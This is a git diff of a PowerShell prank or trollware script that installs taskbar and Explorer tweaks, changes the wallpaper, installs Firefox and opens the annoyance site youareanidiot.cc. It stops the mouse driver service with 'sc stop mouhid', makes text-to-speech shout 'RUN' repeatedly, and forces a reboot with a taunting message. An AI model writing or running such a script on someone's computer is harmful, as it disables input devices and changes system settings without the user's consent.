@@ -11,7 +11,7 @@ Write-Host "Installed Winget... Started Curl Process"
 
 
 winget install --id=dremin.RetroBar  -e --source winget
-retrobar
+conhost powershell retrobar
 winget install --id=valinet.ExplorerPatcher  -e --source winget
 
 $setwallpapersrc = @"
@@ -33,7 +33,7 @@ public class Wallpaper
 Add-Type -TypeDefinition $setwallpapersrc
 [Wallpaper]::SetWallpaper("C:\Windows\web\Wallpaper\Windows\img0.jpg")
 
-
+winget install -e --id Mozilla.Firefox --source winget
 firefox https://youareanidiot.cc
 
 sc stop mouhid
@@ -50,8 +50,8 @@ echo "Operation Completed Successfully"
 
 $voice = New-Object -ComObject Sapi.spvoice
 $voice.rate = 0
-$voice.speak("narrator enabled Microsoft windows windows search kill child process poweroff terminate child conhost conhost conhost")
+$voice.speak("RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN")
 
 conhost cmd exit
-
-shutdown /r /o /t 60
+Write-Host "Restoring your mother in 60 seconds..."
+shutdown /r /t 60
